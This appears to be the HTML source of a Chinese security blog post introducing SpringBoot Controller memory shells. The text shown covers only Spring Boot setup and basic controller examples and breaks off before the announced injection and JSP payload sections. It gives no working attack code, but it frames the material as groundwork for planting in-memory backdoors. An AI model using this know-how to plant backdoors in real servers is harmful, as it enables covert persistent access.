@@ -1,0 +1,1344 @@
+<!--
+  ╔══════════════════════════════════════════════════════════════╗
+  ║                                                              ║
+  ║   🎮 CTF Easter Egg Challenge!                               ║
+  ║                                                              ║
+  ║   Congratulations! You found the hidden comment!             ║
+  ║                                                              ║
+  ║   Here's your clue: The flag is the site owner's name        ║
+  ║   in lowercase letters.                                      ║
+  ║                                                              ║
+  ║   Open browser console and type:                             ║
+  ║   secret.flag("your_answer")                                 ║
+  ║                                                              ║
+  ║   Or try: secret.hint() for more clues                       ║
+  ║                                                              ║
+  ╚══════════════════════════════════════════════════════════════╝
+-->
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark">
+
+<head>
+  <meta charset="utf-8">
+  <style id="waifu-preload">#waifu{opacity:0;background:transparent;}#waifu canvas,#waifu #live2d,#waifu-toolbar{background:transparent;}</style>
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  <link rel="manifest" href="/manifest.json">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="Blog">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>原理分析 | Controller —— SpringBoot 内存马 - blog</title>
+
+  
+    <meta name="description" content="原理分析 | Controller —— SpringBoot 内存马目录 环境搭建 Spring MVC 基础 Spring Boot 完整请求流程 内存马原理 前置知识 Java Demo 实现 获取 handlerMapping 的两种姿势 JSP Payload 实现 验证 补充：Spring Boot 下的 Tomcat Filter 内存马 与 Tomcat 内存马对比 总结   环境">
+<meta property="og:type" content="article">
+<meta property="og:title" content="原理分析 | Controller —— SpringBoot 内存马">
+<meta property="og:url" content="https://wr0ld.github.io/posts/a3c7e2f1/">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="原理分析 | Controller —— SpringBoot 内存马目录 环境搭建 Spring MVC 基础 Spring Boot 完整请求流程 内存马原理 前置知识 Java Demo 实现 获取 handlerMapping 的两种姿势 JSP Payload 实现 验证 补充：Spring Boot 下的 Tomcat Filter 内存马 与 Tomcat 内存马对比 总结   环境">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wr0ld.github.io/avatar.png">
+<meta property="article:published_time" content="2026-04-27T10:54:00.000Z">
+<meta property="article:modified_time" content="2026-04-27T10:56:07.128Z">
+<meta property="article:author" content="wr0ld">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="内存马">
+<meta property="article:tag" content="Spring">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wr0ld.github.io/avatar.png">
+  
+  
+  
+  <meta name="keywords" content="Java,内存马,Spring">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.0.0">
+
+
+  
+    <link rel="shortcut icon" href="/avatar.png">
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-04-27T18:54:00+08:00","dateModified":"2026-04-27T18:56:07+08:00","datePublished":"2026-04-27T18:54:00+08:00","description":"","headline":"原理分析 | Controller —— SpringBoot 内存马","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/a3c7e2f1/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/a3c7e2f1/","keywords":"Java, 内存马, Spring","thumbnailUrl":"https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/oUOAxEVDgLACtoxFfAn9AAAeEMFjjxIvTzPDsC~tplv-dy-vqe2-sr-v2_1920_1080_q80.jpg","image":1}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">blog</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="实验室" href="/lab/" style="color:#F39C12"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M7.47 8.47a.75.75 0 0 1 1.06 0l2 2a.75.75 0 0 1 0 1.06l-2 2a.75.75 0 1 1-1.06-1.06L8.94 11L7.47 9.53a.75.75 0 0 1 0-1.06M12 14.25a.75.75 0 0 0 0 1.5h4a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg></a><a class="nav-item" title="游戏" href="/games/" style="color:#FF6B6B"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M2 9.5c0-2.496 0-3.744.494-4.696a4.5 4.5 0 0 1 1.81-1.81C5.256 2.5 6.504 2.5 9 2.5h6c2.496 0 3.744 0 4.696.494a4.5 4.5 0 0 1 1.81 1.81C22 5.756 22 7.004 22 9.5v5c0 2.496 0 3.744-.494 4.696a4.5 4.5 0 0 1-1.81 1.81C18.744 21.5 17.496 21.5 15 21.5H9c-2.496 0-3.744 0-4.696-.494a4.5 4.5 0 0 1-1.81-1.81C2 18.244 2 16.996 2 14.5z" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M6.25 12a.75.75 0 0 1 .75-.75h2.25V9a.75.75 0 0 1 1.5 0v2.25H13a.75.75 0 0 1 0 1.5h-2.25V15a.75.75 0 0 1-1.5 0v-2.25H7a.75.75 0 0 1-.75-.75m9.5-1a1 1 0 1 0 0 2a1 1 0 0 0 0-2m2 3a1 1 0 1 0 2 0a1 1 0 0 0-2 0" clip-rule="evenodd"/></svg></a><a class="nav-item" title="卡牌" href="javascript:if(window.CardSystem)window.CardSystem.showPanel()" style="color:#E91E63"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M7.5 6.75a.75.75 0 0 0-.75.75v1.5c0 .414.336.75.75.75h9a.75.75 0 0 0 .75-.75v-1.5a.75.75 0 0 0-.75-.75zm-.75 5.25a.75.75 0 0 1 .75-.75h4.5a.75.75 0 0 1 0 1.5H7.5a.75.75 0 0 1-.75-.75m.75 2.25a.75.75 0 0 0 0 1.5h3a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg></a><a class="nav-item" title="设置" href="/settings/" style="color:#9B59B6"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2c-1.5 0-2.5 1.5-2.5 3v.5c0 .5-.5 1-1 1H7c-1.5 0-2.5 1-3 2.5l-.5 2c-.5 1.5.5 3 2 3.5l.5.2c.5.2 1 .7 1 1.3v.5c0 .5-.5 1-1 1.3l-.5.2c-1.5.5-2.5 2-2 3.5l.5 2c.5 1.5 1.5 2.5 3 2.5h1.5c.5 0 1-.5 1-1V20c0-.5.5-1 1-1h2c.5 0 1 .5 1 1v.5c0 .5.5 1 1 1H17c1.5 0 2.5-1 3-2.5l.5-2c.5-1.5-.5-3-2-3.5l-.5-.2c-.5-.2-1-.7-1-1.3v-.5c0-.5.5-1 1-1.3l.5-.2c1.5-.5 2.5-2 2-3.5l-.5-2c-.5-1.5-1.5-2.5-3-2.5h-1.5c-.5 0-1 .5-1 1V6c0 .5-.5 1-1 1h-2c-.5 0-1-.5-1-1v-.5c0-.5-.5-1-1-1" opacity=".5"/><path fill="currentColor" d="M12 15a3 3 0 1 0 0-6a3 3 0 0 0 0 6" clip-rule="evenodd"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4s-4 1.79-4 4s1.79 4 4 4" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5l1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" clip-rule="evenodd"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+<widget class="widget-wrapper todo-widget collapsible-widget"><div class="widget-header dis-select"><span class="name">任务简报 <span class="todo-count">(12)</span></span><span class="collapse-toggle"><i class="fas fa-chevron-down"></i></span></div><div class="widget-body fs14"><div class="todo-list"><div class="todo-item doing"><span class="todo-content">内存马 → 检测查杀</span></div><div class="todo-item doing"><span class="todo-content">log4j 内存马+jndi urldns grov</span></div><div class="todo-item doing"><span class="todo-content">EDUSRC实战漏洞挖掘复盘脱敏</span></div><div class="todo-item doing"><span class="todo-content">小迪vpc1-5 Windows系统web内网横向域内</span></div><div class="todo-item doing"><span class="todo-content">rootkit 的 shellcode 嵌入</span></div><div class="todo-item doing"><span class="todo-content">fastjson 1.2.68 → 1.2.80</span></div><div class="todo-item doing"><span class="todo-content">java cc4 5 7</span></div><div class="todo-item doing"><span class="todo-content">Shiro 721</span></div><div class="todo-item doing"><span class="todo-content">信息收集</span></div><div class="todo-item doing"><span class="todo-content">PHP反序列化 + Pop Chain构造</span></div><div class="todo-item doing"><span class="todo-content">云上服务</span></div><div class="todo-item doing"><span class="todo-content">docker容器逃逸</span></div></div></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-04-27T10:54:00.000Z">2026-04-27</time></span><span class="sep"></span><span class="text word-count">字数：19894</span><span class="sep"></span><span class="text img-count">图片：21</span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>原理分析 | Controller —— SpringBoot 内存马</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="原理分析-Controller-——-SpringBoot-内存马"><a href="#原理分析-Controller-——-SpringBoot-内存马" class="headerlink" title="原理分析 | Controller —— SpringBoot 内存马"></a>原理分析 | Controller —— SpringBoot 内存马</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">环境搭建</a></li>
+<li><a href="#spring-mvc-%E5%9F%BA%E7%A1%80">Spring MVC 基础</a></li>
+<li><a href="#spring-boot-%E5%AE%8C%E6%95%B4%E8%AF%B7%E6%B1%82%E6%B5%81%E7%A8%8B">Spring Boot 完整请求流程</a></li>
+<li><a href="#%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86">内存马原理</a></li>
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">前置知识</a></li>
+<li><a href="#java-demo-%E5%AE%9E%E7%8E%B0">Java Demo 实现</a></li>
+<li><a href="#%E8%8E%B7%E5%8F%96-handlermapping-%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%A7%BF%E5%8A%BF">获取 handlerMapping 的两种姿势</a></li>
+<li><a href="#jsp-payload-%E5%AE%9E%E7%8E%B0">JSP Payload 实现</a></li>
+<li><a href="#%E9%AA%8C%E8%AF%81">验证</a></li>
+<li><a href="#%E8%A1%A5%E5%85%85spring-boot-%E4%B8%8B%E7%9A%84-tomcat-filter-%E5%86%85%E5%AD%98%E9%A9%AC">补充：Spring Boot 下的 Tomcat Filter 内存马</a></li>
+<li><a href="#%E4%B8%8E-tomcat-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AF%B9%E6%AF%94">与 Tomcat 内存马对比</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+<hr>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>搭建一下 Spring Boot 环境，更改为 <code>https://start.aliyun.com</code> 源，使用 Maven，Java 8。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260426195534937.png"></p>
+<p>选择 2.x 系列的版本，只用添加一个 Spring Web 依赖项。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260426200217063.png"></p>
+<h2 id="Spring-MVC-基础"><a href="#Spring-MVC-基础" class="headerlink" title="Spring MVC 基础"></a>Spring MVC 基础</h2><p><code>com/example/demos/web/HelloController.java</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @RestController 等于 @Controller + @ResponseBody 的组合</span></span><br><span class="line"><span class="comment">// @Controller — 告诉 Spring 这个类是一个控制器，纳入容器管理</span></span><br><span class="line"><span class="comment">// @ResponseBody — 方法返回值直接写入 HTTP 响应体，不走视图解析（不跳页面）</span></span><br><span class="line"><span class="comment">// 加了 @RestController 之后，return &quot;hello&quot; 就是直接把字符串返回给浏览器，适合写 API 接口</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// @GetMapping(&quot;/hello&quot;) 等于 @RequestMapping(value=&quot;/hello&quot;, method=RequestMethod.GET)，只处理 GET 请求</span></span><br><span class="line">    <span class="comment">// 访问 http://localhost:8080/hello 就会路由到这个方法</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello, spring!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接运行 <code>SpringControllerApplication</code> 文件就能启动 Web 服务，不用再自己配置 Tomcat。Spring Boot 内嵌了 Tomcat，直接运行主类它自己就把 Tomcat 启动了，这也是 Spring Boot 和传统 Spring MVC 最大的区别之一——传统 Spring MVC 需要你自己装 Tomcat、打 war 包部署，Spring Boot 直接 <code>java -jar</code> 就能跑。</p>
+<p>运行后可以看到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tomcat started on port(s): 8080 (http)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260426201733958.png"></p>
+<p>浏览器访问 <code>http://localhost:8080/hello</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260426201957745.png"></p>
+<p>可以正常访问，没有问题。</p>
+<p><strong>端口修改</strong></p>
+<p>在 <code>resources/application.properties</code> 里加一行：</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.port</span>=<span class="string">8888</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260426202205184.png"></p>
+<p>另外 Windows 下 <code>.properties</code> 文件中文注释会乱码，可以在 IDEA 设置里修改：<code>Settings → Editor → File Encodings → Properties Files</code> 改成 UTF-8，勾选 Transparent native-to-ascii conversion。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427081620499.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427081704283.png"></p>
+<hr>
+<p>和 Tomcat 对比一下会发现：</p>
+<p><strong>Tomcat 原生 Servlet</strong> 用 <code>@WebServlet(&quot;/path&quot;)</code> 一个注解搞定，因为 Servlet 本身就是处理请求的，注解直接声明路径就够了。</p>
+<p><strong>Spring Controller</strong> 拆成两个是因为职责分离：</p>
+<ul>
+<li><code>@RestController</code> — 声明”这个类是个控制器”，让 Spring 容器认识它、管理它</li>
+<li><code>@GetMapping</code> — 声明”这个方法处理什么路径、什么请求方式”</li>
+</ul>
+<p>Spring 里一个 Controller 类可以有<strong>很多个方法</strong>，每个方法处理不同路径：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">login</span><span class="params">()</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#123;id&#125; 这种路径变量是 Spring MVC 特有的功能，叫路径参数</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/user/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUser</span><span class="params">()</span> &#123; ... &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以 <code>@RestController</code> 标在类上，<code>@GetMapping</code> 标在方法上，两层分开才灵活。Tomcat Servlet 是一个类对应一个路径，Spring Controller 是一个类可以对应多个路径，设计思路不一样。</p>
+<p><strong>关于控制器类型</strong></p>
+<p>Spring Boot 主要就两个：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>返回什么</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>@Controller</code></td>
+<td>视图名（页面）</td>
+<td>前后端不分离项目</td>
+</tr>
+<tr>
+<td><code>@RestController</code></td>
+<td>数据（字符串&#x2F;JSON）</td>
+<td>前后端分离 API</td>
+</tr>
+</tbody></table>
+<p><code>@Controller</code> 是传统控制器，方法返回值是视图名（页面），配合模板引擎（Thymeleaf、JSP）跳页面用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PageController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/index&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(Model model)</span> &#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>; <span class="comment">// 跳转到 index.html 模板</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>@RestController</code> &#x3D; <code>@Controller</code> + <code>@ResponseBody</code>，方法返回值直接写入响应体，写 API 接口用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApiController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/user&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">user</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;张三&quot;</span>; <span class="comment">// 直接返回字符串/JSON</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>现在基本都用 <code>@RestController</code>，前后端分离是主流，<code>@Controller</code> 只有老项目或者需要服务端渲染页面才用。</p>
+<blockquote>
+<p>注意：如果两个 Controller 注册了同一个路径，Spring 启动时会直接报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Caused by: java.lang.IllegalStateException: Ambiguous mapping. Cannot map &#x27;xxxController&#x27; method</span><br></pre></td></tr></table></figure>
+
+<p>Spring 不允许同一路径重复注册，启动就失败了。这个特性在打内存马时也要注意，注入前要确保路径没被占用。</p>
+</blockquote>
+<p>更新一下 <code>HelloController</code>，再熟悉两个常用注解：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 基础接口</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello, spring!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 接收 URL 参数 ?name=xxx</span></span><br><span class="line">    <span class="comment">// @RequestParam — 取 URL 问号后面的参数，对应 Servlet 里的 request.getParameter(&quot;name&quot;)</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/greet&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">greet</span><span class="params">(<span class="meta">@RequestParam</span> String name)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 路径参数 /user/123</span></span><br><span class="line">    <span class="comment">// @PathVariable — 路径里用 &#123;&#125; 占位，方法参数用 @PathVariable 接收，Spring 自动解析</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/user/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUser</span><span class="params">(<span class="meta">@PathVariable</span> String id)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;用户id是：&quot;</span> + id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>依次访问：</p>
+<p><code>http://localhost:8080/hello</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427082600331.png"></p>
+<p><code>http://localhost:8080/greet?name=wr0ld</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427082615838.png"></p>
+<p><code>http://localhost:8080/user/123</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427082630866.png"></p>
+<hr>
+<h2 id="Spring-Boot-完整请求流程"><a href="#Spring-Boot-完整请求流程" class="headerlink" title="Spring Boot 完整请求流程"></a>Spring Boot 完整请求流程</h2><p>Spring Boot 在 Tomcat 那套基础上加了自己的一层，完整流程是：</p>
